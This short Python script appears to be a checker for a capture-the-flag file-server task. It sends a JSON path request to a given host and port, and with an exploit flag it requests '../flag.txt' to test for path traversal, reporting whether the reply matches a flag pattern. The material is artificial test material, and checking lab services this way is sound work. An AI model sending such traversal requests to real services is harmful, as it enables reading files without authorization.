import argparse
import json
import re
import socket

FLAG = re.compile(r"^[A-Z0-9]{35}=$")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--path", default="public/welcome.txt")
    parser.add_argument("--exploit", action="store_true")
    args = parser.parse_args()
    path = "../flag.txt" if args.exploit else args.path
    try:
        with socket.create_connection((args.host, args.port), timeout=3) as conn:
            conn.sendall(json.dumps({"path": path}).encode() + b"\n")
            payload = json.loads(conn.makefile("rb").readline(65537))
        content = payload.get("content")
        print(json.dumps({"ok": payload.get("ok", False), "flag_found": isinstance(content, str) and bool(FLAG.fullmatch(content)), "flag_format_valid": isinstance(content, str) and bool(FLAG.fullmatch(content)), "error": payload.get("error", "")}))
    except Exception as error:
        print(json.dumps({"ok": False, "flag_found": False, "flag_format_valid": False, "connection_error": type(error).__name__}))


if __name__ == "__main__":
    main()
